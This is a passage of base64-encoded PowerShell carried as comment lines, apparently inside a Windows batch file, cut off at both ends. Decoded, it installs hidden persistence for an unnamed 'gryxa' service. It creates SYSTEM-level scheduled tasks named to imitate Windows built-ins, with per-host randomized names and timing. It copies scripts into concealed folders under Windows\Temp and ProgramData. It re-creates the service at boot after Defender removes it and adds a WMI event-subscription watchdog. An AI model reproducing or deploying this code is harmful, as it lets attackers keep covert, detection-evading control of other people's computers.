::XSREZWVwLA0KICAgIFtzd2l0Y2hdJEZvcmNlLA0KICAgIFtzd2l0Y2hdJE5vV2Fp
::dA0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGlu
::dWUnDQokY2ZnUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2Zn
::Jw0KJElkZW50VmVyc2lvbiA9IDgNCg0KIyBSb290LWxldmVsIG5hbWVzIFdJVEhP
::VVQgbGVhZGluZyBiYWNrc2xhc2ggKG1hdGNoZXMgd29ya2luZyBXdWNhY2hlT3du
::IHN0eWxlKS4NCiRQb29scyA9IEB7DQogICAgQSA9IEAoJ1dlclF1ZXVlU3luYycs
::J0RpYWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNhY2hlJywnV2RpSG9zdFByb3h5Jywn
::UGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25mbGljdFJlcycsJ1NyQ2FjaGVTeW5j
::JywnUmVzb2x1dGlvblF1ZXVlJykNCiAgICBCID0gQCgnUGxhU2VydmVySGVhbHRo
::JywnV2RpSG9zdFByb3h5JywnV2VyUXVldWVTeW5jJywnTmV0VHJhY2VDYWNoZScs
::J0RpYWdIb3N0Q2FjaGUnLCdUY3BJcENvbmZsaWN0UmVzJywnUGxhU2VydmVyRGlh
::ZycsJ1NyQ2FjaGVTeW5jJykNCiAgICBDID0gQCgnUmVzb2x1dGlvblF1ZXVlJywn
::TmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxpY3RSZXMnLCdXZXJRdWV1ZVN5bmMn
::LCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9zdENhY2hlJywnUGxhU2VydmVyRGlh
::ZycsJ1dkaUhvc3RQcm94eScpDQogICAgRCA9IEAoJ1RjcElwQ29uZmxpY3RSZXMn
::LCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFjZUNhY2hlJywnRGlhZ0hvc3RDYWNo
::ZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFs
::dGgnLCdXZGlIb3N0UHJveHknKQ0KfQ0KJERlZmF1bHRzID0gW29yZGVyZWRdQHsN
::CiAgICBUQVNLX0EgPSAnV2VyUXVldWVTeW5jJw0KICAgIFRBU0tfQiA9ICdQbGFT
::ZXJ2ZXJIZWFsdGgnDQogICAgVEFTS19DID0gJ1dkaUhvc3RQcm94eScNCiAgICBU
::QVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycNCiAgICBNT19BICAgPSAnMicNCiAg
::ICBNT19CICAgPSAnMycNCn0NCg0KZnVuY3Rpb24gR2V0LUhvc3RTZWVkIHsNCiAg
::ICAkcyA9IDBMDQogICAgZm9yZWFjaCAoJGMgaW4gJGVudjpDT01QVVRFUk5BTUUu
::VG9VcHBlcigpLlRvQ2hhckFycmF5KCkpIHsgJHMgPSAoJHMgKiAzMSArIFtpbnRd
::JGMpICUgMTAwMDAwMDAwNyB9DQogICAgcmV0dXJuICRzDQp9DQoNCmZ1bmN0aW9u
::IFJlYWQtSWRlbnRpdHkgew0KICAgICRpZCA9ICREZWZhdWx0cy5DbG9uZSgpDQog
::ICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkgew0KICAgICAgICBmb3JlYWNoICgk
::bGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3Jj
::ZSkpIHsNCiAgICAgICAgICAgIGlmICgkbGluZSAtbWF0Y2ggJ15ccyooW0EtWl9d
::Kylccyo9XHMqKC4rPylccyokJykgeyAkaWRbJG1hdGNoZXNbMV1dID0gJG1hdGNo
::ZXNbMl0gfQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkaWQNCn0NCg0K
::ZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChbc3RyaW5nXSR0bikgew0KICAgIGlm
::ICgkdG4pIHsgJiBzY2h0YXNrcy5leGUgL0RlbGV0ZSAvVE4gJHRuIC9GIDI+JjEg
::fCBPdXQtTnVsbCB9DQp9DQoNCmZ1bmN0aW9uIEdldC1UYXNrVmVyYm9zZUJsb2Io
::W3N0cmluZ10kdG4pIHsNCiAgICBpZiAoLW5vdCAkdG4pIHsgcmV0dXJuICcnIH0N
::CiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUgL1F1ZXJ5IC9UTiAkdG4gL0ZPIExJ
::U1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFTVEVYSVRDT0RFIC1uZSAwIC1vciAt
::bm90ICRvdXQpIHsgcmV0dXJuICcnIH0NCiAgICByZXR1cm4gKCgkb3V0IHwgRm9y
::RWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2luICJgbiIpDQp9DQoNCmZ1bmN0aW9u
::IFRlc3QtVGFza093bnNNb24oW3N0cmluZ10kdG4sIFtzdHJpbmddJG1hcmtlcikg
::ew0KICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBzY2hlZHVsZWQgYWN0aW9uIHBvaW50
::cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBub3QgYSBXaW5kb3dzIENPTSBoYW5k
::bGVyLg0KICAgICRibG9iID0gR2V0LVRhc2tWZXJib3NlQmxvYiAkdG4NCiAgICBp
::ZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZhbHNlIH0NCiAgICBpZiAoJG1hcmtl
::ciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRtYXJrZXIpKSkg
::eyByZXR1cm4gJHRydWUgfQ0KICAgIGlmICgkYmxvYiAtbWF0Y2ggJyg/aSlcLnd1
::Y2FjaGVcXHxvd25fbW9uXC5jbWR8ZXRsX21vblwuY21kfFwuZXRsY2FjaGVcXCcp
::IHsgcmV0dXJuICR0cnVlIH0NCiAgICByZXR1cm4gJGZhbHNlDQp9DQoNCmZ1bmN0
::aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0KICAgICMgSWRlbXBvdGVudCB3aXRo
::aW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4gUG9vbCB1cGdyYWRlcyBidW1wIElE
::RU5UVkVSOg0KICAgICMgb3duZWQgb2xkLW5hbWUgdGFza3MgYXJlIGRlbGV0ZWQ7
::IFdpbmRvd3MgYnVpbHQtaW5zIHdpdGggc2FtZSBuYW1lIGFyZSBsZWZ0IGFsb25l
::Lg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1BhdGgpIHsNCiAgICAgICAgJG9sZCA9
::IFJlYWQtSWRlbnRpdHkNCiAgICAgICAgIyBMNzogYWxzbyByZWdlbmVyYXRlIGlm
::IGFueSBUQVNLXyogaXMgZW1wdHkgKEw0LUw2IG1vZHVsby9jYXN0IGJ1Z3MgbGVm
::dCBibGFuayBzbG90cykNCiAgICAgICAgJHNsb3RzT2sgPSAoJG9sZFsnSURFTlRW
::RVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAtYW5kICRvbGRbJ1RBU0tfQSddIC1h
::bmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xkWydUQVNLX0MnXSAtYW5kICRvbGRb
::J1RBU0tfRCddDQogICAgICAgIGlmICgkc2xvdHNPaykgeyByZXR1cm4gJG9sZCB9
::DQogICAgICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNL
::X0MnLCdUQVNLX0QnKSB7DQogICAgICAgICAgICAkdG4gPSBbc3RyaW5nXSRvbGRb
::JGtdDQogICAgICAgICAgICBpZiAoLW5vdCAkdG4pIHsgY29udGludWUgfQ0KICAg
::ICAgICAgICAgIyBOZXZlciBkZWxldGUgYSByZWFsIFdpbmRvd3MgdGFzayB3ZSBu
::ZXZlciBvd25lZCAoVFIgaXMgQ09NL2N1c3RvbSBoYW5kbGVyKS4NCiAgICAgICAg
::ICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAnJykgeyBSZW1vdmUtVGFza1F1
::aWV0ICR0biB9DQogICAgICAgIH0NCiAgICAgICAgUmVtb3ZlLUl0ZW0gLUxpdGVy
::YWxQYXRoICRjZmdQYXRoIC1Gb3JjZQ0KICAgIH0NCiAgICAkcyA9IEdldC1Ib3N0
::U2VlZA0KICAgICMgTDQ6IHR3byBzbG90cyBtYXkgaGFzaCB0byB0aGUgc2FtZSB0
::YXNrIHBhdGggKHBvb2xzIHNoYXJlIG5hbWVzKSAtPg0KICAgICMgb25lIHBoeXNp
::Y2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdvIHNsb3RzIGFuZCB0aGUgZmxlZXQg
::c2hvd3MgMy80Lg0KICAgICMgV2FsayBlYWNoIHBvb2wgZm9yd2FyZCB1bnRpbCB0
::aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNsb3RzLg0KICAgICMgTDY6IHRoZSBv
::bGQgQChAKCdBJywgJHMgJSA4KSwgLi4uKSBmb3JtIHdhcyBkb3VibGUtYnJva2Vu
::IGluIFBTIDUuMToNCiAgICAjIGJhcmUgJSBpbnNpZGUgQCgpIHBhcnNlcyBhcyB0
::aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5vdCBtb2R1bG8pLCBzbyB0aGUNCiAg
::ICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFuZCB0aGUgbG9vcCBuZXZlciByYW4g
::LT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQ0KICAgICMgVEFTS18qIGFuZCB0aGUg
::d2hvbGUgZmxlZXQgZmVsbCBiYWNrIHRvIGlkZW50aWNhbCBkZWZhdWx0IHRhc2sg
::bmFtZXMuDQogICAgJHNlZWRzID0gW29yZGVyZWRdQHsNCiAgICAgICAgQSA9ICgk
::cyAlIDgpDQogICAgICAgIEIgPSAoKCRzICsgMykgJSA4KQ0KICAgICAgICBDID0g
::KCgkcyArIDUpICUgOCkNCiAgICAgICAgRCA9ICgoJHMgKyA3KSAlIDgpDQogICAg
::fQ0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9DQogICAgZm9yZWFjaCAoJGxldHRl
::ciBpbiAnQScsJ0InLCdDJywnRCcpIHsNCiAgICAgICAgJGkgPSBbaW50XSRzZWVk
::c1skbGV0dGVyXQ0KICAgICAgICAkbmFtZSA9ICRQb29sc1skbGV0dGVyXVskaV0N
::CiAgICAgICAgJG4gPSAwDQogICAgICAgIHdoaWxlICgkcGljay5WYWx1ZXMgLWNv
::bnRhaW5zICRuYW1lIC1hbmQgJG4gLWx0IDgpIHsgJGkgPSAoJGkgKyAxKSAlIDg7
::ICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRpXTsgJG4rKyB9DQogICAgICAgIGlm
::ICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERlZmF1bHRzWyJUQVNLXyRsZXR0ZXIi
::XSB9DQogICAgICAgICRwaWNrWyRsZXR0ZXJdID0gJG5hbWUNCiAgICB9DQogICAg
::JGNmZyA9IEAoDQogICAgICAgICJUQVNLX0E9JCgkcGljay5BKSINCiAgICAgICAg
::IlRBU0tfQj0kKCRwaWNrLkIpIg0KICAgICAgICAiVEFTS19DPSQoJHBpY2suQyki
::DQogICAgICAgICJUQVNLX0Q9JCgkcGljay5EKSINCiAgICAgICAgIk1PX0E9JCgy
::ICsgKCRzICUgNCkpIiAgICAgICAgICAjIDItNSBtaW4gaml0dGVyDQogICAgICAg
::ICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMpKSIgICAgIyAzLTUgbWluIGppdHRl
::cg0KICAgICAgICAiU0VFRD0kcyINCiAgICAgICAgIklERU5UVkVSPSRJZGVudFZl
::cnNpb24iDQogICAgKQ0KICAgIFNldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkY2Zn
::UGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UNCiAgICByZXR1cm4gKFJlYWQtSWRlbnRp
::dHkpDQp9DQoNCmZ1bmN0aW9uIE5vcm1hbGl6ZS1UYXNrTmFtZShbc3RyaW5nXSR0
::bikgew0KICAgIGlmICgtbm90ICR0bikgeyByZXR1cm4gJycgfQ0KICAgIHJldHVy
::biAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcpDQp9DQoNCmZ1bmN0aW9uIFdyaXRl
::LU93bkxvZyhbc3RyaW5nXSRtKSB7DQogICAgJGxvZyA9IEpvaW4tUGF0aCAkV29y
::a0RpciAnYm9vdC5lcnInDQogICAgdHJ5IHsgQWRkLUNvbnRlbnQgLUxpdGVyYWxQ
::YXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9IGNhdGNoIHt9DQp9DQoNCmZ1bmN0
::aW9uIEVuc3VyZS1QZXJzaXN0VGFza3Mgew0KICAgICMgTWlycm9yIHdvcmtpbmcg
::ZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNjaHRhc2tzLCBCT09UIFRSIHBhdGgs
::IC9TVCBvbiBNSU5VVEUuDQogICAgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eQ0K
::ICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1QYXRoICRX
::b3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAgICRib290ID0gSm9pbi1QYXRoICRl
::bnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNoZScNCiAgICAkZXRsRGlyID0gJ0M6
::XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFnbm9zaXNcU3RhdGVcLmV0bGNhY2hl
::Jw0KICAgIGZvcmVhY2ggKCRkIGluIEAoJGJvb3QsICRldGxEaXIpKSB7DQogICAg
::ICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRkKSkgeyBOZXct
::SXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1QYXRoICRkIC1Gb3JjZSB8IE91dC1O
::dWxsIH0NCiAgICB9DQogICAgJGJvb3RNb24gPSBKb2luLVBhdGggJGJvb3QgJ293
::bl9tb24uY21kJw0KICAgICRib290RXRsID0gSm9pbi1QYXRoICRib290ICdldGxf
::bW9uLmNtZCcNCiAgICAkZXRsTW9uID0gSm9pbi1QYXRoICRldGxEaXIgJ2V0bF9t
::b24uY21kJw0KICAgIGlmIChUZXN0LVBhdGggLUxpdGVyYWxQYXRoICRNb25QYXRo
::KSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggJE1vblBhdGggLURl
::c3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZQ0KICAgICAgICBDb3B5LUl0ZW0gLUxpdGVyYWxQYXRoICRNb25QYXRo
::IC1EZXN0aW5hdGlvbiAkYm9vdEV0bCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVu
::dGx5Q29udGludWUNCiAgICAgICAgQ29weS1JdGVtIC1MaXRlcmFsUGF0aCAkTW9u
::UGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAtRm9yY2UgLUVycm9yQWN0aW9uIFNp
::bGVudGx5Q29udGludWUNCiAgICB9DQogICAgIyBMMzc6IGRlZGljYXRlZCBib290
::IGdyeXhhLWhlYWwuIERlZmVuZGVyIGNhbiBzdHJpcCB0aGUgZ3J5eGEgU0NNIHNl
::cnZpY2UgZW50cnkgZHVyaW5nDQogICAgIyBib290IGJlZm9yZSB0aGUgbW9uJ3Mg
::TUlOVVRFIHRhc2sgZmlyZXMuIEEgYm9vdC10cmlnZ2VyIGVuc3VyZSAoLU5vV2Fp
::dCAtRm9yY2UpIHJlLWNyZWF0ZXMNCiAgICAjIGl0IHdpdGhpbiBzZWNvbmRzIG9m
::IHN0YXJ0dXAsIHNvIHJlYm9vdHMgbm8gbG9uZ2VyIGRyb3AgdGhlIGhvc3QgZnJv
::bSBncnl4YS4NCiAgICAkYm9vdEdyeXhhID0gSm9pbi1QYXRoICRib290ICdncnl4
::YV9ib290LmNtZCcNCiAgICAkbGliSW5Cb290ID0gSm9pbi1QYXRoICRib290ICdv
::d25fbGliLnBzMScNCiAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9p
::bi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBzMScpKSB7DQogICAgICAgIENvcHkt
::SXRlbSAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAnb3duX2xpYi5w
::czEnKSAtRGVzdGluYXRpb24gJGxpYkluQm9vdCAtRm9yY2UgLUVycm9yQWN0aW9u
::IFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAgJGdiTGluZXMgPSBAKA0KICAg
::ICAgICAnQGVjaG8gb2ZmJywNCiAgICAgICAgKCdzdGFydCAvbWluICIiIHBvd2Vy
::c2hlbGwgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAi
::ezB9IiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtRGVlcCAtRm9yY2UgLU5vV2FpdCAt
::V29ya0RpciAiezF9IiAtQnVpbGQgQk9PVCcgLWYgJGxpYkluQm9vdCwgJFdvcmtE
::aXIpLA0KICAgICAgICAnZXhpdCcNCiAgICApDQogICAgU2V0LUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRib290R3J5eGEgLVZhbHVlICRnYkxpbmVzIC1FbmNvZGluZyBB
::U0NJSSAtRm9yY2UNCiAgICAjIEJPT1QgaXMgbm90IExvY2tEaXInZCBieSBvd25f
::c2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBUUiB0aGVyZS4N
::CiAgICAkdHJNb24gPSAiY21kLmV4ZSAvYyAkYm9vdE1vbiINCiAgICAkdHJFdGwg
::PSAiY21kLmV4ZSAvYyAkYm9vdEV0bCINCiAgICAkdHJHcnl4YSA9ICJjbWQuZXhl
::IC9jICRib290R3J5eGEiDQogICAgJG1vQSA9IFtzdHJpbmddJGlkWydNT19BJ107
::IGlmICgtbm90ICRtb0EpIHsgJG1vQSA9ICcyJyB9DQogICAgJG1vQiA9IFtzdHJp
::bmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1vQiA9ICczJyB9DQog
::ICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygnSEg6bW0nKQ0KICAgICRzcGVj
::cyA9IEAoDQogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJrZXIgPSAnb3du
::X21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRyID0gJHRyTW9u
::IH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9ICdldGxfbW9u
::LmNtZCc7IFNjID0gJ01JTlVURSc7IE1vID0gJG1vQjsgVHIgPSAkdHJFdGwgfQ0K
::ICAgICAgICBAeyBLZXkgPSAnVEFTS19DJzsgTWFya2VyID0gJ293bl9tb24uY21k
::JzsgU2MgPSAnT05TVEFSVCc7IE1vID0gJyc7IFRyID0gJHRyTW9uIH0NCiAgICAg
::ICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9uLmNtZCc7IFNj
::ID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9DQogICAgICAgIEB7
::IEtleSA9ICdUQVNLX0cnOyBNYXJrZXIgPSAnZ3J5eGFfYm9vdC5jbWQnOyBTYyA9
::ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJHcnl4YSB9DQogICAgKQ0KICAg
::ICRvayA9IDA7ICRyZWFybWVkID0gMDsgJGZhaWwgPSAwDQogICAgZm9yZWFjaCAo
::JHNwIGluICRzcGVjcykgew0KICAgICAgICAjIFRBU0tfRyAoYm9vdCBncnl4YS1o
::ZWFsKSB1c2VzIGEgZml4ZWQgbmFtZTsgdGhlIEEtRCByb3RhdGlvbiBwb29sIGhh
::cyBubyBzbG90IGZvciBpdC4NCiAgICAgICAgJHRuID0gaWYgKCRzcC5LZXkgLWVx
::ICdUQVNLX0cnKSB7ICdXdWNhY2hlR3J5eGFCb290JyB9IGVsc2UgeyBOb3JtYWxp
::emUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXldKSB9DQogICAgICAgIGlm
::ICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9DQogICAgICAgIGlmIChU
::ZXN0LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSB7ICRvaysrOyBjb250aW51
::ZSB9DQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5N
::YXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0NCiAgICAgICAgJGJsb2IgPSBHZXQt
::VGFza1ZlcmJvc2VCbG9iICR0bg0KICAgICAgICBpZiAoLW5vdCAkYmxvYikgeyAk
::YmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgKCJcJHRuIikgfQ0KICAgICAgICBp
::ZiAoJGJsb2IpIHsNCiAgICAgICAgICAgICRvdXJzQnJva2VuID0gKCRibG9iIC1t
::YXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8Z3J5eGFfYm9vdFwu
::Y21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpDQogICAgICAgICAgICBpZiAo
::LW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25Mb2cgInRhc2tz
::X3NraXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9DQogICAgICAgICAgICBSZW1v
::dmUtVGFza1F1aWV0ICR0bg0KICAgICAgICAgICAgUmVtb3ZlLVRhc2tRdWlldCAo
::IlwkdG4iKQ0KICAgICAgICB9DQogICAgICAgICMgQnVpbGQgY21kbGluZSBleGFj
::dGx5IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3b3JrIGFzIFNZU1RF
::TSkuDQogICAgICAgICRwYXJ0cyA9IEAoDQogICAgICAgICAgICAnL0NyZWF0ZScs
::ICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdISUdIRVNUJywg
::Jy9GJywNCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0MnLCAkc3AuU2MN
::CiAgICAgICAgKQ0KICAgICAgICBpZiAoJHNwLlNjIC1lcSAnTUlOVVRFJykgew0K
::ICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycsICRzcC5NbywgJy9TVCcsICRz
::dCkNCiAgICAgICAgfQ0KICAgICAgICAkYXJnTGluZSA9ICgkcGFydHMgfCBGb3JF
::YWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNoICdbXHMiXScp
::IHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9IGVsc2UgeyAk
::XyB9DQogICAgICAgIH0pIC1qb2luICcgJw0KICAgICAgICAkY3JlYXRlVHh0ID0g
::Y21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYxIHwgRm9yRWFj
::aC1PYmplY3QgeyAiJF8iIH0NCiAgICAgICAgJGNyZWF0ZUpvaW5lZCA9ICgkY3Jl
::YXRlVHh0IC1qb2luICcgJykuVHJpbSgpDQogICAgICAgIFdyaXRlLU93bkxvZyAi
::dGFza3NfY3JlYXRlICQoJHNwLktleSkgJHRuID0+ICRjcmVhdGVKb2luZWQiDQog
::ICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1hcmtlcikgLW9y
::IChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIpKSB7DQogICAg
::ICAgICAgICAkcmVhcm1lZCsrDQogICAgICAgICAgICBpZiAoJHNwLktleSAtZXEg
::J1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7DQogICAgICAgICAg
::ICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1ROIGAiJHRuYCIi
::IHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBlbHNlIHsNCiAg
::ICAgICAgICAgICRmYWlsKysNCiAgICAgICAgICAgIFdyaXRlLU93bkxvZyAidGFz
::a3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iDQogICAgICAgIH0NCiAgICB9
::DQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVhcm1lZCBmYWls
::PSRmYWlsIg0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cgew0KICAgIGZv
::cmVhY2ggKCRjbHMgaW4gQCgnX19GaWx0ZXJUb0NvbnN1bWVyQmluZGluZycsJ19f
::RXZlbnRGaWx0ZXInLCdDb21tYW5kTGluZUV2ZW50Q29uc3VtZXInLCdfX0ludGVy
::dmFsVGltZXJJbnN0cnVjdGlvbicpKSB7DQogICAgICAgIEdldC1XbWlPYmplY3Qg
::LU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNscyAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBXaGVyZS1PYmpl
::Y3Qgew0KICAgICAgICAgICAgICAgICgkXy5OYW1lIC1lcSAnV3VjYWNoZVdhdGNo
::ZG9nRicpIC1vciAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRvZ0MnKSAtb3IN
::CiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2FjaGVXYXRjaGRv
::ZycpIC1vcg0KICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFuZCAkXy5GaWx0
::ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0YqJykgLW9yDQog
::ICAgICAgICAgICAgICAgKCRfLkNvbnN1bWVyIC1hbmQgJF8uQ29uc3VtZXIuVG9T
::dHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJykNCiAgICAgICAgICAg
::IH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0LU51bGwgfQ0K
::ICAgIH0NCn0NCg0KZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7DQogICAgaWYg
::KC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICRmYWxzZSB9DQogICAgUmVtb3ZlLVdh
::dGNoZG9nDQogICAgJG9rID0gJHRydWUNCiAgICB0cnkgew0KICAgICAgICBTZXQt
::V21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3Mg
::X19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYA0KICAgICAgICAgICAgLUFyZ3Vt
::ZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IEludGVydmFsTWls
::bGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFsc2UgfSB8IE91
::dC1OdWxsDQogICAgICAgICRmID0gU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ug
::cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgYA0KICAgICAg
::ICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRjaGRvZ0YnOyBF
::dmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5ndWFnZSA9ICdX
::UUwnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9ICJTRUxFQ1Qg
::KiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNhY2hlV2F0Y2hk
::b2cnIiB9DQogICAgICAgICRjID0gU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ug
::cm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1l
::ciBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAnV3VjYWNoZVdh
::dGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4ZSAvYyBgIiRN
::b25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0NCiAgICAgICAg
::U2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNs
::YXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYA0KICAgICAgICAgICAgLUFy
::Z3VtZW50cyBAeyBGaWx0ZXIgPSAkZjsgQ29uc3VtZXIgPSAkYyB9IHwgT3V0LU51
::bGwNCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0NCiAgICByZXR1cm4gJG9r
::DQp9DQoNCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7DQogICAgJHQgPSBH
::ZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNz
::IF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIC1GaWx0ZXIgIlRpbWVySWQ9J1d1
